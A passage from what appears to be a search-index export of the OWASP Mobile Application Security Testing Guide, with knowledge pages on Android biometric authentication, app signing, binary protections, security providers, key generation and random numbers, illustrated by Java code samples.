<pre><code>try {\n    KeyStore keyStore = KeyStore.getInstance(\"AndroidKeyStore\");\n    keyStore.load(null);\n    KeyGenerator keyGenerator = KeyGenerator.getInstance(\n            KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n\n    // Set the alias of the entry in Android KeyStore where the key will appear\n    // and the constrains (purposes) in the constructor of the Builder\n    keyGenerator.init(new KeyGenParameterSpec.Builder(KEY_NAME,\n            KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n            .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n            .setUserAuthenticationRequired(true)\n                    // Require that the user has unlocked in the last 30 seconds\n            .setUserAuthenticationValidityDurationSeconds(30)\n            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n            .build());\n    keyGenerator.generateKey();\n} catch (NoSuchAlgorithmException | NoSuchProviderException\n        | InvalidAlgorithmParameterException | KeyStoreException\n        | CertificateException | IOException e) {\n    throw new RuntimeException(\"Failed to create a symmetric key\", e);\n}\n</code></pre> </li> <li> <p>Set up the lock screen to confirm:</p> <pre><code>private static final int REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS = 1; //used as a number to verify whether this is where the activity results from\nIntent intent = mKeyguardManager.createConfirmDeviceCredentialIntent(null, null);\nif (intent != null) {\n    startActivityForResult(intent, REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS);\n}\n</code></pre> </li> <li> <p>Use the key after lock screen:</p> <pre><code>@Override\nprotected void onActivityResult(int requestCode, int resultCode, Intent data) {\n    if (requestCode == REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS) {\n        // Challenge completed, proceed with using cipher\n        if (resultCode == RESULT_OK) {\n            //use the key for the actual authentication flow\n        } else {\n            // The user canceled or didn\u2019t complete the lock screen\n            // operation. Go to error/cancellation flow.\n        }\n    }\n}\n</code></pre> </li> </ul>","tags":["android","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/#invalidating-keys","title":"Invalidating Keys","text":"<p>Android 7.0 (API level 24) adds the <code>setInvalidatedByBiometricEnrollment(boolean invalidateKey)</code> method to <code>KeyGenParameterSpec.Builder</code>. When <code>invalidateKey</code> value is set to <code>true</code> (the default), keys that are valid for fingerprint authentication are irreversibly invalidated when a new fingerprint is enrolled. This prevents an attacker from retrieving they key even if they are able to enroll an additional fingerprint.</p>","tags":["android","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/#biometric-third-party-sdks","title":"Biometric Third-Party SDKs","text":"<p>Make sure that fingerprint authentication and/or other types of biometric authentication are exclusively based on the Android SDK and its APIs. If this is not the case, ensure that the alternative SDK has been properly vetted for any weaknesses. Make sure that the SDK is backed by the TEE/SE which unlocks a (cryptographic) secret based on the biometric authentication. This secret should not be unlocked by anything else, but a valid biometric entry. That way, it should never be the case that the fingerprint logic can be bypassed.</p>","tags":["android","MASVS-AUTH","know"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0002/","title":"MASTG-KNOW-0002: FingerprintManager","text":"<p>Deprecated</p> <p>Reason: The FingerprintManager class is deprecated in Android 9 (API level 28) and should not be used for new applications. Instead, use the BiometricPrompt API or the Biometric library for Android.</p> <p>Use instead:</p> <ul> <li> Biometric Authentication</li> </ul> <p>Android 6.0 (API level 23) introduced public APIs for authenticating users via fingerprint, but is deprecated in Android 9 (API level 28). Access to the fingerprint hardware is provided through the <code>FingerprintManager</code> class. An app can request fingerprint authentication by instantiating a <code>FingerprintManager</code> object and calling its <code>authenticate</code> method. The caller registers callback methods to handle possible outcomes of the authentication process (i.e. success, failure, or error). Note that this method doesn't constitute strong proof that fingerprint authentication has actually been performed - for example, the authentication step could be patched out by an attacker, or the \"success\" callback could be overloaded using dynamic instrumentation.</p> <p>You can achieve better security by using the fingerprint API in conjunction with the Android <code>KeyGenerator</code> class. With this approach, a symmetric key is stored in the Android KeyStore and unlocked with the user's fingerprint. For example, to enable user access to a remote service, an AES key is created which encrypts the authentication token. By calling <code>setUserAuthenticationRequired(true)</code> when creating the key, it is ensured that the user must re-authenticate to retrieve it. The encrypted authentication token can then be saved directly on the device (e.g. via Shared Preferences). This design is a relatively safe way to ensure the user actually entered an authorized fingerprint.</p> <p>An even more secure option is using asymmetric cryptography. Here, the mobile app creates an asymmetric key pair in the KeyStore and enrolls the public key on the server backend. Later transactions are then signed with the private key and verified by the server using the public key.</p>","tags":["android","MASVS-AUTH","know","deprecated"]},{"location":"MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0002/#implementation","title":"Implementation","text":"<p>This section describes how to implement biometric authentication by using the <code>FingerprintManager</code> class. Please keep in mind that this class is deprecated and the Biometric library should be used instead as a best practice. This section is just for reference, in case you come across such an implementation and need to analyze it.</p> <p>Begin by searching for <code>FingerprintManager.authenticate</code> calls. The first parameter passed to this method should be a <code>CryptoObject</code> instance which is a wrapper class for crypto objects supported by FingerprintManager. Should the parameter be set to <code>null</code>, this means the fingerprint authorization is purely event-bound, likely creating a security issue.</p> <p>The creation of the key used to initialize the cipher wrapper can be traced back to the <code>CryptoObject</code>. Verify the key was both created using the <code>KeyGenerator</code> class in addition to <code>setUserAuthenticationRequired(true)</code> being called during creation of the <code>KeyGenParameterSpec</code> object (see code samples below).</p> <p>Make sure to verify the authentication logic. For the authentication to be successful, the remote endpoint must require the client to present the secret retrieved from the KeyStore, a value derived from the secret, or a value signed with the client private key (see above).</p> <p>Safely implementing fingerprint authentication requires following a few simple principles, starting by first checking if that type of authentication is even available. On the most basic front, the device must run Android 6.0 or higher (API 23+). Four other prerequisites must also be verified:</p> <ul> <li> <p>The permission must be requested in the Android Manifest:</p> <pre><code>&lt;uses-permission\n    android:name=\"android.permission.USE_FINGERPRINT\" /&gt;\n</code></pre> </li> <li> <p>Fingerprint hardware must be available:</p> <pre><code>FingerprintManager fingerprintManager = (FingerprintManager)\n                context.getSystemService(Context.FINGERPRINT_SERVICE);\nfingerprintManager.isHardwareDetected();\n</code></pre> </li> <li> <p>The user must have a protected lock screen:</p> <pre><code>KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);\nkeyguardManager.isKeyguardSecure();  //note if this is not the case: ask the user to setup a protected lock screen\n</code></pre> </li> <li> <p>At least one finger should be registered:</p> <pre><code>fingerprintManager.hasEnrolledFingerprints();\n</code></pre> </li> <li> <p>The application should have permission to ask for a user fingerprint:</p> <pre><code>context.checkSelfPermission(Manifest.permission.USE_FINGERPRINT) == PermissionResult.PERMISSION_GRANTED;\n</code></pre> </li> </ul> <p>If any of the above checks fail, the option for fingerprint authentication should not be offered.</p> <p>It is important to remember that not every Android device offers hardware-backed key storage. The <code>KeyInfo</code> class can be used to find out whether the key resides inside secure hardware such as a Trusted Execution Environment (TEE) or Secure Element (SE).</p> <pre><code>SecretKeyFactory factory = SecretKeyFactory.getInstance(getEncryptionKey().getAlgorithm(), ANDROID_KEYSTORE);\nKeyInfo secetkeyInfo = (KeyInfo) factory.getKeySpec(yourencryptionkeyhere, KeyInfo.class);\nsecetkeyInfo.isInsideSecureHardware()\n</code></pre> <p>On certain systems, it is possible to enforce the policy for biometric authentication through hardware as well. This is checked by:</p> <pre><code>keyInfo.isUserAuthenticationRequirementEnforcedBySecureHardware();\n</code></pre> <p>The following describes how to do fingerprint authentication using a symmetric key pair.</p> <p>Fingerprint authentication may be implemented by creating a new AES key using the <code>KeyGenerator</code> class by adding <code>setUserAuthenticationRequired(true)</code> in <code>KeyGenParameterSpec.Builder</code>.</p> <pre><code>generator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, KEYSTORE);\n\ngenerator.init(new KeyGenParameterSpec.Builder (KEY_ALIAS,\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setUserAuthenticationRequired(true)\n        .build()\n);\n\ngenerator.generateKey();\n</code></pre> <p>To perform encryption or decryption with the protected key, create a <code>Cipher</code> object and initialize it with the key alias.</p> <pre><code>SecretKey keyspec = (SecretKey)keyStore.getKey(KEY_ALIAS, null);\n\nif (mode == Cipher.ENCRYPT_MODE) {\n    cipher.init(mode, keyspec);\n</code></pre> <p>Keep in mind, a new key cannot be used immediately - it has to be authenticated through the <code>FingerprintManager</code> first. This involves wrapping the <code>Cipher</code> object into <code>FingerprintManager.CryptoObject</code> which is passed to <code>FingerprintManager.authenticate</code> before it will be recognized.</p> <pre><code>cryptoObject = new FingerprintManager.CryptoObject(cipher);\nfingerprintManager.authenticate(cryptoObject, new CancellationSignal(), 0, this, null);\n</code></pre> <p>The callback method <code>onAuthenticationSucceeded(FingerprintManager.AuthenticationResult result)</code> is called when the authentication succeeds. The authenticated <code>CryptoObject</code> can then be retrieved from the result.</p> <pre><code>public void authenticationSucceeded(FingerprintManager.AuthenticationResult result) {\n    cipher = result.getCryptoObject().getCipher();\n\n    //(... do something with the authenticated cipher object ...)\n}\n</code></pre> <p>The following describes how to do fingerprint authentication using an asymmetric key pair.</p> <p>To implement fingerprint authentication using asymmetric cryptography, first create a signing key using the <code>KeyPairGenerator</code> class, and enroll the public key with the server. You can then authenticate pieces of data by signing them on the client and verifying the signature on the server. A detailed example for authenticating to remote servers using the fingerprint API can be found in the Android Developers Blog.</p> <p>A key pair is generated as follows:</p> <pre><code>KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_EC, \"AndroidKeyStore\");\nkeyPairGenerator.initialize(\n        new KeyGenParameterSpec.Builder(MY_KEY,\n                KeyProperties.PURPOSE_SIGN)\n                .setDigests(KeyProperties.DIGEST_SHA256)\n                .setAlgorithmParameterSpec(new ECGenParameterSpec(\"secp256r1\"))\n                .setUserAuthenticationRequired(true)\n                .build());\nkeyPairGenerator.generateKeyPair();\n</code></pre> <p>To use the key for signing, you need to instantiate a CryptoObject and authenticate it through <code>FingerprintManager</code>.</p> <pre><code>Signature.getInstance(\"SHA256withECDSA\");\nKeyStore keyStore = KeyStore.getInstance(\"AndroidKeyStore\");\nkeyStore.load(null);\nPrivateKey key = (PrivateKey) keyStore.getKey(MY_KEY, null);\nsignature.initSign(key);\nCryptoObject cryptoObject = new FingerprintManager.CryptoObject(signature);\n\nCancellationSignal cancellationSignal = new CancellationSignal();\nFingerprintManager fingerprintManager =\n        context.getSystemService(FingerprintManager.class);\nfingerprintManager.authenticate(cryptoObject, cancellationSignal, 0, this, null);\n</code></pre> <p>You can now sign the contents of a byte array <code>inputBytes</code> as follows.</p> <pre><code>Signature signature = cryptoObject.getSignature();\nsignature.update(inputBytes);\nbyte[] signed = signature.sign();\n</code></pre> <ul> <li>Note that in cases where transactions are signed, a random nonce should be generated and added to the signed data. Otherwise, an attacker could replay the transaction.</li> <li>To implement authentication using symmetric fingerprint authentication, use a challenge-response protocol.</li> </ul>","tags":["android","MASVS-AUTH","know","deprecated"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0003/","title":"MASTG-KNOW-0003: App Signing","text":"<p>Android requires all APKs to be digitally signed with a certificate before they are installed or run. The digital signature is used to verify the owner's identity for application updates. This process can prevent an app from being tampered with or modified to include malicious code.</p> <p>When an APK is signed, a public-key certificate is attached to it. This certificate uniquely associates the APK with the developer and the developer's private key. When an app is being built in debug mode, the Android SDK signs the app with a debug key created specifically for debugging purposes. An app signed with a debug key is not meant to be distributed and won't be accepted in most app stores, including the Google Play Store.</p> <p>The final release build of an app must be signed with a valid release key. In Android Studio, the app can be signed manually or via creation of a signing configuration that's assigned to the release build type.</p> <p>Prior Android 9 (API level 28) all app updates on Android need to be signed with the same certificate, so a validity period of 25 years or more is recommended. Apps published on Google Play must be signed with a key that that has a validity period ending after October 22th, 2033.</p> <p>Three APK signing schemes are available:</p> <ul> <li>JAR signing (v1 scheme),</li> <li>APK Signature Scheme v2 (v2 scheme),</li> <li>APK Signature Scheme v3 (v3 scheme).</li> </ul> <p>The v2 signature, which is supported by Android 7.0 (API level 24) and above, offers improved security and performance compared to v1 scheme. The V3 signature, which is supported by Android 9 (API level 28) and above, gives apps the ability to change their signing keys as part of an APK update. This functionality assures compatibility and apps continuous availability by allowing both the new and the old keys to be used. Note that it is only available via  apksigner at the time of writing.</p> <p>For each signing scheme the release builds should always be signed via all its previous schemes as well.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0004/","title":"MASTG-KNOW-0004: Third-Party Libraries","text":"<p>Android apps often make use of third party libraries. These third party libraries accelerate development as the developer has to write less code in order to solve a problem. There are two categories of libraries:</p> <ul> <li>Libraries that are not (or should not) be packed within the actual production application, such as <code>Mockito</code> used for testing and libraries like <code>JavaAssist</code> used to compile certain other libraries.</li> <li>Libraries that are packed within the actual production application, such as <code>Okhttp3</code>.</li> </ul> <p>These libraries can lead to unwanted side-effects:</p> <ul> <li>A library can contain a vulnerability, which will make the application vulnerable. A good example are the versions of <code>OKHTTP</code> prior to 2.7.5 in which TLS chain pollution was possible to bypass SSL pinning.</li> <li>A library can no longer be maintained or hardly be used, which is why no vulnerabilities are reported and/or fixed. This can lead to having bad and/or vulnerable code in your application through the library.</li> <li>A library can use a license, such as LGPL2.1, which requires the application author to provide access to the source code for those who use the application and request insight in its sources. In fact the application should then be allowed to be redistributed with modifications to its sourcecode. This can endanger the intellectual property (IP) of the application.</li> </ul> <p>Please note that this issue can hold on multiple levels: When you use webviews with JavaScript running in the webview, the JavaScript libraries can have these issues as well. The same holds for plugins/libraries for Cordova, React-native and Xamarin apps.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0005/","title":"MASTG-KNOW-0005: Memory Corruption Bugs","text":"<p>Android applications run on a VM where most of the memory corruption issues have been taken care off. This does not mean that there are no memory corruption bugs. Take CVE-2018-9522 for instance, which is related to serialization issues using Parcels. Next, in native code, we still see the same issues as we explained in the general memory corruption section. Last, we see memory bugs in supporting services, such as with the Stagefright attack as shown at BlackHat.</p> <p>Memory leaks are often an issue as well. This can happen for instance when a reference to the <code>Context</code> object is passed around to non-<code>Activity</code> classes, or when you pass references to <code>Activity</code> classes to your helper classes.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0006/","title":"MASTG-KNOW-0006: Binary Protection Mechanisms","text":"<p>Detecting the presence of binary protection mechanisms heavily depend on the language used for developing the application.</p> <p>In general all binaries should be tested, which includes both the main app executable as well as all libraries/dependencies. However, on Android we will focus on native libraries since the main executables are considered safe as we will see next.</p> <p>Android optimizes its Dalvik bytecode from the app DEX files (e.g. classes.dex) and generates a new file containing the native code, usually with an .odex, .oat extension. This Android compiled binary (see \"Compiled App Binary\" in  Exploring the App Package) is wrapped using the ELF format which is the format used by Linux and Android to package assembly code.</p> <p>The app's NDK native libraries (see \"Native Libraries\" in  Exploring the App Package) also use the ELF format.</p> <ul> <li>PIE (Position Independent Executable):<ul> <li>Since Android 7.0 (API level 24), PIC compilation is enabled by default for the main executables.</li> <li>With Android 5.0 (API level 21), support for non-PIE enabled native libraries was dropped and since then, PIE is enforced by the linker.</li> </ul> </li> <li>Memory management:<ul> <li>Garbage Collection will simply run for the main binaries and there's nothing to be checked on the binaries themselves.</li> <li>Garbage Collection does not apply to Android native libraries. The developer is responsible for doing proper manual memory management. See \"Memory Corruption Bugs\".</li> </ul> </li> <li>Stack Smashing Protection:<ul> <li>Android apps get compiled to Dalvik bytecode which is considered memory safe (at least for mitigating buffer overflows). Other frameworks such as Flutter will not compile using stack canaries because of the way their language, in this case Dart, mitigates buffer overflows.</li> <li>It must be enabled for Android native libraries but it might be difficult to fully determine it.<ul> <li>NDK libraries should have it enabled since the compiler does it by default.</li> <li>Other custom C/C++ libraries might not have it enabled.</li> </ul> </li> </ul> </li> </ul> <p>Learn more:</p> <ul> <li>Android executable formats</li> <li>Android runtime (ART)</li> <li>Android NDK</li> <li>Android linker changes for NDK developers</li> </ul>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0007/","title":"MASTG-KNOW-0007: Debuggable Apps","text":"<p>Debugging is an essential process for developers to identify and fix errors or bugs in their Android app. By using a debugger, developers can select the device to debug their app on and set breakpoints in their Java, Kotlin, and C/C++ code. This allows them to analyze variables and evaluate expressions at runtime, which helps them to identify the root cause of many issues. By debugging their app, developers can improve the functionality and user experience of their app, ensuring that it runs smoothly without any errors or crashes.</p> <p>Every debugger-enabled process runs an extra thread for handling JDWP protocol packets. This thread is started only for apps that have the <code>android:debuggable=\"true\"</code> attribute in the <code>Application</code> element within the Android Manifest.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0008/","title":"MASTG-KNOW-0008: Debugging Symbols","text":"<p>Generally, you should provide compiled code with as little explanation as possible. Some metadata, such as debugging information, line numbers, and descriptive function or method names, make the binary or bytecode easier for the reverse engineer to understand, but these aren't needed in a release build and can therefore be safely omitted without impacting the app's functionality.</p> <p>To inspect native binaries, use a standard tool like <code>nm</code> or <code>objdump</code> to examine the symbol table. A release build should generally not contain any debugging symbols. If the goal is to obfuscate the library, removing unnecessary dynamic symbols is also recommended.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0009/","title":"MASTG-KNOW-0009: StrictMode","text":"<p>StrictMode is a developer tool for detecting violations, e.g. accidental disk or network access to the app's main thread. It can also be used to check for good coding practices, such as implementing performant code.</p> <p>Different policies can be set using the ThreadPolicy Builder and the VmPolicy Builder.</p> <p>Reaction to detected policy violations can be set using one or more of the <code>penalty*</code> methods. For example, <code>penaltyLog()</code> can be enabled to log any policy violation to the system log.</p> <p>Below is an example of <code>StrictMode</code> with policies enabled for disk and network access to the main thread. If this is detected, a log message is written to the system log, and the app is forced to crash.</p> <pre><code>public void onCreate() {\n     if (BuildConfig.DEBUG) {\n         StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()\n                 .detectDiskReads()\n                 .detectDiskWrites()\n                 .detectNetwork()   // or .detectAll() for all detectable problems\n                 .penaltyLog()\n                 .build());\n         StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder()\n                 .detectLeakedSqlLiteObjects()\n                 .detectLeakedClosableObjects()\n                 .penaltyLog()\n                 .penaltyDeath()\n                 .build());\n     }\n     super.onCreate();\n }\n</code></pre> <p>It is recommended to include the policy in the <code>if</code> statement with the <code>BuildConfig.DEBUG</code> condition to automatically enable StrictMode policies only for debug builds of your app.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0010/","title":"MASTG-KNOW-0010: Exception Handling","text":"<p>Exceptions occur when an application gets into an abnormal or error state. Both Java and C++ may throw exceptions. Testing exception handling is about ensuring that the app will handle an exception and transition to a safe state without exposing sensitive information via the UI or the app's logging mechanisms.</p>","tags":["android","MASVS-CODE","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0011/","title":"MASTG-KNOW-0011: Security Provider","text":"<p>Android relies on a security provider via the <code>java.security.Provider</code> class to implement Java Security services and provide SSL/TLS-based connections. These providers are crucial to ensure secure network communications and secure other functionalities which depend on cryptography. The list of security providers included in Android varies between versions of Android and the OEM-specific builds.</p> <p>The problem with this kind of security provider (one example is OpenSSL), which comes with the device, is that it often has bugs and/or vulnerabilities. Thus, Android applications should not only choose the correct algorithms and provide a good configuration, in some cases they should also pay attention to the strength of the implementations in the legacy security providers.</p> <p>To avoid known vulnerabilities, developers need to make sure that the application will install a proper security provider. Since July 11, 2016, Google has been rejecting Play Store application submissions (both new applications and updates) that use vulnerable versions of OpenSSL.</p>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0011/#listing-the-available-security-providers","title":"Listing the Available Security Providers","text":"<p>You can list the set of existing security providers using following code:</p> <pre><code>StringBuilder builder = new StringBuilder();\nfor (Provider provider : Security.getProviders()) {\n    builder.append(\"provider: \")\n            .append(provider.getName())\n            .append(\" \")\n            .append(provider.getVersion())\n            .append(\"(\")\n            .append(provider.getInfo())\n            .append(\")\\n\");\n}\nString providers = builder.toString();\n//now display the string on the screen or in the logs for debugging.\n</code></pre> <p>This is the output for Android 9 (API level 28) running in an emulator with Google Play APIs:</p> <pre><code>provider: AndroidNSSP 1.0(Android Network Security Policy Provider)\nprovider: AndroidOpenSSL 1.0(Android's OpenSSL-backed security provider)\nprovider: CertPathProvider 1.0(Provider of CertPathBuilder and CertPathVerifier)\nprovider: AndroidKeyStoreBCWorkaround 1.0(Android KeyStore security provider to work around Bouncy Castle)\nprovider: BC 1.57(BouncyCastle Security Provider v1.57)\nprovider: HarmonyJSSE 1.0(Harmony JSSE Provider)\nprovider: AndroidKeyStore 1.0(Android KeyStore security provider)\n</code></pre>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0011/#updating-the-security-provider","title":"Updating the Security Provider","text":"<p>Keeping up-to-date and patched component is one of security principles. The same applies to <code>provider</code>. Application should check if used security provider is up-to-date and if not, update it.</p>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0011/#older-android-versions","title":"Older Android versions","text":"<p>For some applications that support older versions of Android (e.g., only used on versions lower than Android 7.0 (API level 24)), bundling an up-to-date library may be the only option. Conscrypt library is a good choice in this situation to keep the cryptography consistent across the different API levels and avoid having to import Bouncy Castle which is a heavier library.</p> <p>Conscrypt for Android can be imported this way:</p> <pre><code>dependencies {\n  implementation 'org.conscrypt:conscrypt-android:last_version'\n}\n</code></pre> <p>Next, the provider must be registered by calling:</p> <pre><code>Security.addProvider(Conscrypt.newProvider())\n</code></pre>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0012/","title":"MASTG-KNOW-0012: Key Generation","text":"<p>The Android SDK allows you to specify how a key should be generated, and under which circumstances it can be used. Android 6.0 (API level 23) introduced the <code>KeyGenParameterSpec</code> class that can be used to ensure the correct key usage in the application. For example:</p> <pre><code>String keyAlias = \"MySecretKey\";\n\nKeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec.Builder(keyAlias,\n        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)\n        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)\n        .setRandomizedEncryptionRequired(true)\n        .build();\n\nKeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES,\n        \"AndroidKeyStore\");\nkeyGenerator.init(keyGenParameterSpec);\n\nSecretKey secretKey = keyGenerator.generateKey();\n</code></pre> <p>The <code>KeyGenParameterSpec</code> indicates that the key can be used for encryption and decryption, but not for other purposes, such as signing or verifying. It further specifies the block mode (CBC), padding (PKCS #7), and explicitly specifies that randomized encryption is required (this is the default). Next, we enter <code>AndroidKeyStore</code> as the name of the provider in the <code>KeyGenerator.getInstance</code> call to ensure that the keys are stored in the Android KeyStore.</p> <p>GCM is an AES mode that provides authenticated encryption, enhancing security by integrating encryption and data authentication into a single process, unlike older modes such as CBC that require separate mechanisms such as HMACs. In addition, GCM does not require padding, which simplifies implementation and minimizes vulnerabilities.</p> <p>Attempting to use the generated key in violation of the above spec would result in a security exception.</p> <p>Here's an example of using that key to encrypt:</p> <pre><code>String AES_MODE = KeyProperties.KEY_ALGORITHM_AES\n        + \"/\" + KeyProperties.BLOCK_MODE_CBC\n        + \"/\" + KeyProperties.ENCRYPTION_PADDING_PKCS7;\nKeyStore AndroidKeyStore = AndroidKeyStore.getInstance(\"AndroidKeyStore\");\n\n// byte[] input\nKey key = AndroidKeyStore.getKey(keyAlias, null);\n\nCipher cipher = Cipher.getInstance(AES_MODE);\ncipher.init(Cipher.ENCRYPT_MODE, key);\n\nbyte[] encryptedBytes = cipher.doFinal(input);\nbyte[] iv = cipher.getIV();\n// save both the IV and the encryptedBytes\n</code></pre> <p>Both the IV (initialization vector) and the encrypted bytes need to be stored; otherwise decryption is not possible.</p> <p>Here's how that cipher text would be decrypted. The <code>input</code> is the encrypted byte array and <code>iv</code> is the initialization vector from the encryption step:</p> <pre><code>// byte[] input\n// byte[] iv\nKey key = AndroidKeyStore.getKey(AES_KEY_ALIAS, null);\n\nCipher cipher = Cipher.getInstance(AES_MODE);\nIvParameterSpec params = new IvParameterSpec(iv);\ncipher.init(Cipher.DECRYPT_MODE, key, params);\n\nbyte[] result = cipher.doFinal(input);\n</code></pre> <p>Since the IV is randomly generated each time, it should be saved along with the cipher text (<code>encryptedBytes</code>) in order to decrypt it later.</p> <p>Prior to Android 6.0 (API level 23), AES key generation was not supported. As a result, many implementations chose to use RSA and generated a public-private key pair for asymmetric encryption using <code>KeyPairGeneratorSpec</code> or used <code>SecureRandom</code> to generate AES keys.</p> <p>Here's an example of <code>KeyPairGenerator</code> and <code>KeyPairGeneratorSpec</code> used to create the RSA key pair:</p> <pre><code>Date startDate = Calendar.getInstance().getTime();\nCalendar endCalendar = Calendar.getInstance();\nendCalendar.add(Calendar.YEAR, 1);\nDate endDate = endCalendar.getTime();\nKeyPairGeneratorSpec keyPairGeneratorSpec = new KeyPairGeneratorSpec.Builder(context)\n        .setAlias(RSA_KEY_ALIAS)\n        .setKeySize(4096)\n        .setSubject(new X500Principal(\"CN=\" + RSA_KEY_ALIAS))\n        .setSerialNumber(BigInteger.ONE)\n        .setStartDate(startDate)\n        .setEndDate(endDate)\n        .build();\n\nKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\",\n        \"AndroidKeyStore\");\nkeyPairGenerator.initialize(keyPairGeneratorSpec);\n\nKeyPair keyPair = keyPairGenerator.generateKeyPair();\n</code></pre> <p>This sample creates the RSA key pair with a key size of 4096-bit (i.e. modulus size). Elliptic Curve (EC) keys can also be generated in a similar way. However as of Android 11 (API level 30), AndroidKeyStore does not support encryption or decryption with EC keys. They can only be used for signatures.</p> <p>A symmetric encryption key can be generated from the passphrase by using the Password Based Key Derivation Function version 2 (PBKDF2). This cryptographic protocol is designed to generate cryptographic keys, which can be used for cryptography purpose. Input parameters for the algorithm are adjusted according to improper key generation function section. The code listing below illustrates how to generate a strong encryption key based on a password.</p> <pre><code>public static SecretKey generateStrongAESKey(char[] password, int keyLength)\n{\n    //Initialize objects and variables for later use\n    int iterationCount = 10000;\n    int saltLength     = keyLength / 8;\n    SecureRandom random = new SecureRandom();\n    //Generate the salt\n    byte[] salt = new byte[saltLength];\n    random.nextBytes(salt);\n    KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, iterationCount, keyLength);\n    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\n    byte[] keyBytes = keyFactory.generateSecret(keySpec).getEncoded();\n    return new SecretKeySpec(keyBytes, \"AES\");\n}\n</code></pre> <p>The above method requires a character array containing the password and the needed key length in bits, for instance a 128 or 256-bit AES key. We define an iteration count of 10,000 rounds which will be used by the PBKDF2 algorithm. Increasing the number of iterations significantly increases the workload for a brute-force attack on the password, however it can affect performance as more computational power is required for key derivation. We define the salt size equal to the key length divided by 8 in order to convert from bits to bytes and we use the <code>SecureRandom</code> class to randomly generate a salt. The salt needs to be kept constant to ensure the same encryption key is generated time after time for the same supplied password. Note that you can store the salt privately in <code>SharedPreferences</code>. It is recommended to exclude the salt from the Android backup mechanism to prevent synchronization in case of higher risk data.</p> <p>Note that if you take a rooted device or a patched (e.g. repackaged) application into account as a threat to the data, it might be better to encrypt the salt with a key that is placed in the <code>AndroidKeystore</code>. The Password-Based Encryption (PBE) key is generated using the recommended <code>PBKDF2WithHmacSHA1</code> algorithm, until Android 8.0 (API level 26). For higher API levels, it is best to use <code>PBKDF2withHmacSHA256</code>, which will end up with a longer hash value.</p> <p>Note: there is a widespread false believe that the NDK should be used to hide cryptographic operations and hardcoded keys. However, using this mechanism is not effective. Attackers can still use tools to find the mechanism used and make dumps of the key in memory. Next, the control flow can be analyzed with e.g. radare2 and the keys extracted with the help of Frida or the combination of both:  r2frida (see  Disassembling Native Code and  Process Exploration for more details). From Android 7.0 (API level 24) onward, it is not allowed to use private APIs, instead: public APIs need to be called, which further impacts the effectiveness of hiding it away as described in the Android Developers Blog</p>","tags":["android","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/android/MASVS-CRYPTO/MASTG-KNOW-0013/","title":"MASTG-KNOW-0013: Random number generation","text":"<p>Cryptography requires secure pseudo random number generation (PRNG). Standard Java classes as <code>java.util.Random</code> do not provide sufficient randomness and in fact may make it possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.</p> <p>In general, <code>SecureRandom</code> should be used. However, if the Android versions below Android 4.4 (API level 19) are supported, additional care needs to be taken in order to work around the bug in Android 4.1-4.3 (API level 16-18) versions that failed to properly initialize the PRNG.</p> <p>Most developers should instantiate <code>SecureRandom</code> via the default constructor without any arguments. Other constructors are for more advanced uses and, if used incorrectly, can lead to decreased randomness and security. The PRNG provider backing <code>SecureRandom</code> uses the <code>SHA1PRNG</code> from <code>AndroidOpenSSL</code> (Conscrypt) provider.</p> <p>Check the Android Documentation for more 